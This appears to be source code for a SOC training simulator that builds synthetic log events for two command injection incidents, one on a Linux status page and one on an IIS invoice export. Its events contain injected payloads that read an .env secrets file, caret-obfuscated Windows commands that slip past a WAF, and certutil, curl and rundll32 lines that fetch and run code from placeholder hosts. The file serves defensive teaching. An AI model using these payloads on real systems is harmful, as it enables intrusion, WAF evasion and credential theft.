/**
 * Web injection round (Tal, 2026-11-12), family 1: OS command injection.
 *
 * Every injection family is a parametric template: two or more variants of one attack with a different
 * application, entry point, pretext, server platform and benign look-alike. The picker deals the family
 * first and one variant second (AttackStory.family), and the variation layer redraws attacker addresses
 * and domains per render, so a learner who meets command injection twice reads a different incident.
 *
 * Variants:
 *  - web-inj-cmdi-netcheck: an operations status site's network check runs `ping` through a shell. The
 *    site's WAF policy is in Detection, so the rule fires and the request still reaches Python on Linux.
 *  - web-inj-cmdi-pdfexport: a billing site builds its PDF converter's command line from the invoice name.
 *    The WAF blocks the plain separator; caret-split command names pass it on IIS / Windows.
 *
 * Payloads stay inert and abbreviated: a separator and a harmless discovery command, never a working chain.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { csNetwork, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { mdeNetwork, mdeProcess } from "@/lib/sim/emitters/mde";
import { panWeb } from "@/lib/sim/emitters/paloalto";
import { wafRequest, webAccess, type WebSite } from "@/lib/sim/emitters/web";
import { makeSha256 } from "@/lib/sim/iocs";
import { asUser, clock, ticket, type WebStoryDef } from "./entry";

const IA = "Initial Access", EXEC = "Execution", CRED = "Credential Access", DISC = "Discovery", C2 = "Command and Control", STEALTH = "Stealth";
const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
const SCANNER = "Mozilla/5.0 (compatible; ASV-Scanner/9.6; +https://scanner.example/about)";
const CURL = "curl/8.5.0";

// ══════════════════════════════════════════════════════════════════════════════
// Variant A: network check page, Python behind nginx on Linux, WAF policy in Detection.
// ══════════════════════════════════════════════════════════════════════════════
function netcheck(): TelemetryEvent[] {
  const T = clock("2026-10-06T09:00:00Z");
  const w: WebSite = { site: "status.nexacorp.com", host: "web-status-01.nexacorp.com", ip: "10.20.41.11", server: "nginx", wafMode: "Detection" };
  const atk = "203.0.113.153", scan = "203.0.113.157", mirror = "cdn-pkg-mirror.example", mirrorIp = "203.0.113.155", c2 = "203.0.113.156";
  const api = "/api/v1/netcheck";
  const host = { host: w.host, user: null, srcIp: w.ip };
  const GUNICORN = { parentName: "python3.11", parentPid: 3310 };
  const payload = makeSha256("web_status_kworkerd_payload");
  const sh = (id: string, min: number, pid: number, cmd: string, extra = {}) => csProcess({ id, ts: T(min), ...host, processName: "dash", processPath: "/usr/bin/dash", cmdline: cmd, pid, ...GUNICORN,
    runAsUser: "svc-status", sha256: makeSha256("usr_bin_dash_debian_signed"), description: `Process started on ${w.host}`, ...extra });
  const post = (id: string, min: number, sent: number, matched: string, extra = {}) => wafRequest(w, { id, ts: T(min), srcIp: atk, method: "POST", path: api, action: "count", rule: "cmd_body", matched, location: "REQUEST_BODY",
    ua: CURL, sent, bytes: 412, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched a shell command in a request body", ...extra });
  const answered = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: api, sent, bytes, ua: CURL, mitre: "T1190", tactic: IA,
    description: "Status site answered a network check", ...extra });
  return [
    ticket({ id: "web_ci_001", ts: T(0), table: "change_request", number: "CHG0044611", state: "Implement", severity: "informational",
      shortDescription: "Quarterly external web vulnerability scan, source 203.0.113.157", description: "ServiceNow change CHG0044611 (Implement): quarterly external web vulnerability scan" }),
    webAccess(w, { id: "web_ci_002", ts: T(3), srcIp: "10.10.20.41", method: "POST", path: api, sent: 236, bytes: 388, ua: CHROME, isBaseline: true, description: "Status site answered a network check" }),
    sh("web_ci_003", 3.02, 40112, "sh -c ping -c 2 10.10.30.5", { severity: "high", isDetection: true, mitre: "T1059.004", tactic: EXEC, expectedVerdict: "fp",
      fpExplanation: "The network check working as built: an engineer at the office ran it, the app passed one internal address to ping, and nothing follows the ping." }),
    wafRequest(w, { id: "web_ci_004", ts: T(11), srcIp: scan, path: api, query: "target=127.0.0.1%3Bid", status: 405, bytes: 162, action: "count", rule: "cmd_query", matched: ";id", location: "ARGS:target", ua: SCANNER,
      severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The scan under CHG0044611: the change names the source address, the scanner declares itself, and the GET was refused with 405 before the app ran anything.", description: "WAF rule matched a shell command in a query parameter" }),
    webAccess(w, { id: "web_ci_005", ts: T(11.01), srcIp: scan, path: api, query: "target=127.0.0.1%3Bid", status: 405, bytes: 162, ua: SCANNER, isBaseline: true, description: "Status site refused a request method" }),
    wafRequest(w, { id: "web_ci_006", ts: T(38), srcIp: atk, path: api, query: "target=127.0.0.1%3Bid", status: 405, bytes: 162, action: "count", rule: "cmd_query", matched: ";id", location: "ARGS:target", ua: CURL,
      severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched a shell command in a query parameter" }),
    webAccess(w, { id: "web_ci_007", ts: T(38.01), srcIp: atk, path: api, query: "target=127.0.0.1%3Bid", status: 405, bytes: 162, ua: CURL, mitre: "T1190", tactic: IA, description: "Status site refused a request method" }),
    post("web_ci_008", 39, 48, "; id", { isDetection: true }),
    answered("web_ci_009", 39.01, 48, 431),
    sh("web_ci_010", 39.02, 40377, "sh -c ping -c 2 127.0.0.1; id", { severity: "high", isDetection: true, mitre: "T1059.004", tactic: EXEC }),
    post("web_ci_011", 42, 71, "; cat /opt/status/app/.env", { mitre: "T1552.001", tactic: CRED }),
    answered("web_ci_012", 42.01, 71, 1904, { mitre: "T1552.001", tactic: CRED }),
    sh("web_ci_013", 42.02, 40418, "sh -c ping -c 2 127.0.0.1; cat /opt/status/app/.env", { severity: "medium", mitre: "T1552.001", tactic: CRED }),
    post("web_ci_014", 45, 96, "; curl -s", { mitre: "T1105", tactic: C2 }),
    answered("web_ci_015", 45.01, 96, 418, { mitre: "T1105", tactic: C2 }),
    sh("web_ci_016", 45.02, 40463, `sh -c ping -c 2 127.0.0.1; curl -s https://${mirror}/u.sh -o /tmp/.u.sh && sh /tmp/.u.sh`, { severity: "medium", mitre: "T1105", tactic: C2 }),
    panWeb({ id: "web_ci_017", ts: T(45.03), host: w.host, user: null, srcIp: w.ip, url: `https://${mirror}/u.sh`, domain: mirror, dstIp: mirrorIp, category: "unknown", action: "alert", userAgent: CURL, bytesIn: 3112,
      severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
    csProcess({ id: "web_ci_020", ts: T(45.1), ...host, processName: "dash", processPath: "/usr/bin/dash", cmdline: "sh /tmp/.u.sh", pid: 40481, parentName: "dash", parentPid: 40463, runAsUser: "svc-status",
      sha256: makeSha256("usr_bin_dash_debian_signed"), severity: "medium", mitre: "T1059.004", tactic: EXEC, description: `Process started on ${w.host}` }),
    csProcess({ id: "web_ci_018", ts: T(45.2), ...host, processName: "kworkerd", processPath: "/tmp/.cache/kworkerd", cmdline: "/tmp/.cache/kworkerd", pid: 40502, parentName: "dash", parentPid: 40481,
      runAsUser: "svc-status", sha256: payload, severity: "high", isDetection: true, mitre: "T1036.005", tactic: STEALTH, description: `Process started on ${w.host}` }),
    asUser(csNetwork({ id: "web_ci_019", ts: T(45.4), ...host, remoteIp: c2, remotePort: 443, processName: "kworkerd", processPath: "/tmp/.cache/kworkerd", cmdline: "/tmp/.cache/kworkerd", pid: 40502,
      parentName: "dash", parentPid: 40481, sha256: payload, severity: "medium", mitre: "T1071.001", tactic: C2, description: `Outbound connection from ${w.host}` }), "svc-status"),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// Variant B: invoice PDF export on IIS, the invoice name inside the converter's command line.
// ══════════════════════════════════════════════════════════════════════════════
function pdfExport(): TelemetryEvent[] {
  const T = clock("2026-10-08T13:00:00Z");
  const w: WebSite = { site: "billing.nexacorp.com", host: "web-billing-01.nexacorp.com", ip: "10.20.41.21", server: "iis" };
  const atk = "203.0.113.158", cdn = "files-cdn-update.example", cdnIp = "203.0.113.160", c2 = "203.0.113.159", ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
  const pool = "IIS APPPOOL\\billing", W3WP = { parentName: "w3wp.exe", parentPid: 6120 };
  const host = { host: w.host, user: null, srcIp: w.ip };
  const id = { runAsUser: pool, accountName: "billing", accountDomain: "IIS APPPOOL" };
  const CONVERTER = "\"C:\\Program Files\\wkhtmltopdf\\bin\\wkhtmltopdf.exe\" --quiet https://billing.nexacorp.com/invoices/render";
  const exportCmd = (inv: string, name: string) => `cmd.exe /c ${CONVERTER}?id=${inv} "C:\\inetpub\\billing\\exports\\${name}.pdf"`;
  const cmd = (rid: string, min: number, pid: number, inv: string, name: string, extra = {}) => mdeProcess({ id: rid, ts: T(min), ...host, ...id, ...W3WP, processName: "cmd.exe",
    processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: exportCmd(inv, name), pid, sha256: makeSha256("windows_system32_cmd_exe_signed_microsoft"), signed: true, integrity: "High",
    severity: "medium", isDetection: true, mitre: "T1059.003", tactic: EXEC, description: `Process started on ${w.host}`, ...extra });
  const blocked = (rid: string, min: number, query: string, matched: string, extra = {}) => wafRequest(w, { id: rid, ts: T(min), srcIp: atk, path: "/invoices/export", query, action: "block", rule: "wincmd_query",
    matched, location: "ARGS:name", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched a Windows command in a query parameter", ...extra });
  const passed = (rid: string, min: number, query: string, extra = {}) => wafRequest(w, { id: rid, ts: T(min), srcIp: atk, path: "/invoices/export", query, action: "allow", status: 500, bytes: 1208, ua,
    severity: "low", description: "WAF passed a request to the invoice export", ...extra });
  const failed = (rid: string, min: number, query: string, extra = {}) => webAccess(w, { id: rid, ts: T(min), srcIp: atk, path: "/invoices/export", query, status: 500, bytes: 1208, ua, mitre: "T1190", tactic: IA,
    description: "Billing site answered an invoice export with an error", ...extra });
  return [
    webAccess(w, { id: "web_cw_001", ts: T(2), srcIp: "198.51.100.37", path: "/invoices/export", query: "id=INV-2026-0912&name=INV-2026-0912", bytes: 184220, ua: CHROME, isBaseline: true, description: "Billing site answered an invoice export" }),
    { ...cmd("web_cw_002", 2.01, 7340, "INV-2026-0912", "INV-2026-0912"), expected_verdict: "fp" as const,
      fp_explanation: "The export working as built: the site runs its PDF converter through cmd.exe for every invoice, and this command line holds only the converter and one quoted invoice name, with nothing after it." },
    blocked("web_cw_003", 26, "id=INV-2026-0913&name=x%26whoami", "&whoami", { isDetection: true }),
    blocked("web_cw_004", 26.5, "id=INV-2026-0913&name=x%7Cwhoami", "|whoami"),
    passed("web_cw_005", 27, "id=INV-2026-0913&name=x%22%26w%5Eh%5Eo%5Ea%5Em%5Ei%26%22"),
    failed("web_cw_006", 27.01, "id=INV-2026-0913&name=x%22%26w%5Eh%5Eo%5Ea%5Em%5Ei%26%22"),
    cmd("web_cw_007", 27.02, 7811, "INV-2026-0913", "x\"&w^h^o^a^m^i&\""),
    mdeProcess({ id: "web_cw_008", ts: T(27.03), ...host, ...id, parentName: "cmd.exe", parentPid: 7811, processName: "whoami.exe", processPath: "C:\\Windows\\System32\\whoami.exe", cmdline: "whoami",
      pid: 7822, sha256: makeSha256("windows_system32_whoami_exe_signed_microsoft"), signed: true, integrity: "High", severity: "high", isDetection: true, mitre: "T1033", tactic: DISC, description: `Process started on ${w.host}` }),
    passed("web_cw_009", 31, "id=INV-2026-0913&name=x%22%26c%5Ee%5Er%5Et%5Eu%5Et%5Ei%5El+-urlcache+-split+-f+https%3A%2F%2Ffiles-cdn-update.example%2Fa.dat+C%3A%5CWindows%5CTemp%5Ca.dat%26%22"),
    failed("web_cw_010", 31.01, "id=INV-2026-0913&name=x%22%26c%5Ee%5Er%5Et%5Eu%5Et%5Ei%5El+-urlcache+-split+-f+https%3A%2F%2Ffiles-cdn-update.example%2Fa.dat+C%3A%5CWindows%5CTemp%5Ca.dat%26%22", { mitre: "T1105", tactic: C2 }),
    cmd("web_cw_015", 31.015, 7904, "INV-2026-0913", `x"&c^e^r^t^u^t^i^l -urlcache -split -f https://${cdn}/a.dat C:\\Windows\\Temp\\a.dat&"`, { mitre: "T1105", tactic: C2 }),
    mdeProcess({ id: "web_cw_011", ts: T(31.02), ...host, ...id, parentName: "cmd.exe", parentPid: 7904, processName: "certutil.exe", processPath: "C:\\Windows\\System32\\certutil.exe",
      cmdline: `certutil -urlcache -split -f https://${cdn}/a.dat C:\\Windows\\Temp\\a.dat`, pid: 7915, sha256: makeSha256("windows_system32_certutil_exe_signed_microsoft"), signed: true, integrity: "High",
      severity: "high", isDetection: true, mitre: "T1105", tactic: C2, description: `Process started on ${w.host}` }),
    panWeb({ id: "web_cw_012", ts: T(31.05), host: w.host, user: null, srcIp: w.ip, url: `https://${cdn}/a.dat`, domain: cdn, dstIp: cdnIp, category: "unknown", action: "alert", userAgent: "Microsoft-CryptoAPI/10.0",
      bytesIn: 286720, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
    passed("web_cw_016", 33.9, "id=INV-2026-0913&name=x%22%26r%5Eu%5En%5Ed%5El%5El%5E3%5E2+C%3A%5CWindows%5CTemp%5Ca.dat%2CStart%26%22"),
    failed("web_cw_017", 33.91, "id=INV-2026-0913&name=x%22%26r%5Eu%5En%5Ed%5El%5El%5E3%5E2+C%3A%5CWindows%5CTemp%5Ca.dat%2CStart%26%22", { mitre: "T1218.011", tactic: STEALTH }),
    cmd("web_cw_018", 33.92, 7961, "INV-2026-0913", `x"&r^u^n^d^l^l^3^2 C:\\Windows\\Temp\\a.dat,Start&"`, { mitre: "T1218.011", tactic: STEALTH }),
    mdeProcess({ id: "web_cw_013", ts: T(34), ...host, ...id, parentName: "cmd.exe", parentPid: 7961, processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
      cmdline: "rundll32.exe C:\\Windows\\Temp\\a.dat,Start", pid: 7978, sha256: makeSha256("windows_system32_rundll32_exe_signed_microsoft"), signed: true, integrity: "High",
      severity: "high", isDetection: true, mitre: "T1218.011", tactic: STEALTH, description: `Process started on ${w.host}` }),
    mdeNetwork({ id: "web_cw_014", ts: T(34.2), ...host, remoteIp: c2, remotePort: 443, application: "tls", initiatingProcess: "rundll32.exe", severity: "medium", mitre: "T1071.001", tactic: C2,
      description: `Outbound connection from ${w.host}` }),
  ];
}

export const WEB_INJECTION_CMD_STORIES: WebStoryDef[] = [
  { id: "web-inj-cmdi-netcheck", family: "web-inj-cmdi", mode: "solo", title: "Network Check Page Running More Than Ping", complexity: "core", events: netcheck() },
  { id: "web-inj-cmdi-pdfexport", family: "web-inj-cmdi", mode: "team", title: "Invoice Export Failing and the Billing Server Downloading a File", complexity: "core", events: pdfExport() },
];
